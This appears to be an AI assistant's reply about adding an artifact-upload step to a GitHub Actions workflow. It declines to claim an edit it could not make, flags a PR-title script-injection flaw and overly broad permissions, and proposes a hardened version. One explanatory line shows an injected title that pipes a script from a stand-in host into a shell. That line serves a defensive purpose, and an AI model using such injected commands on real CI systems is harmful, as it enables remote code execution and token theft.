I didn't change the workflow. I don't have a file-editing tool in this session, and the workflow has nothing to attach the upload step to.

**What's in `.github/workflows/deploy.yml` now:**

```yaml
on:
  pull_request:
permissions: write-all
jobs:
  deploy:
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There are no build or test steps, so there's no artifact to upload and no "tests pass" point to put the step after. I need two things from you:

1. **The build and test commands**, e.g. `make build` / `make test` or `npm ci && npm test && npm run build`.
2. **The artifact's path**, e.g. `dist/` or `build/output.tar.gz`.

**Two security problems in this file, worth fixing at the same time:**

- **Line 14 is a script injection risk.** The pull request title goes straight into the shell script. Anyone who opens a PR can use a title like `` x"; curl evil.sh | sh; echo " `` to run commands on the runner. The fix is to pass the title through an environment variable.
- **Line 7, `permissions: write-all`, is too broad for a `pull_request` trigger.** Combined with the injection above, it gives attacker-controlled code a token with write access. Uploading artifacts doesn't need any extra token permissions, so `contents: read` is enough.

**Once you give me the commands and path, the workflow would look like this:**

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
      - name: Build
        run: make build        # replace with your build command
      - name: Test
        run: make test         # replace with your test command
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/          # replace with your artifact path
          if-no-files-found: error
          retention-days: 7
```

The upload step only runs if Build and Test succeed, because steps stop at the first failure by default. `if-no-files-found: error` makes the job fail if the path is wrong, so it doesn't pass silently with nothing uploaded. You should also pin `actions/checkout` and `actions/upload-artifact` to full commit SHAs instead of `@v4`. Look those up from each action's releases page; I haven't filled them in because I'd be guessing.

Send me the commands and path and I'll finish the YAML, or you can paste the version above with your values in.
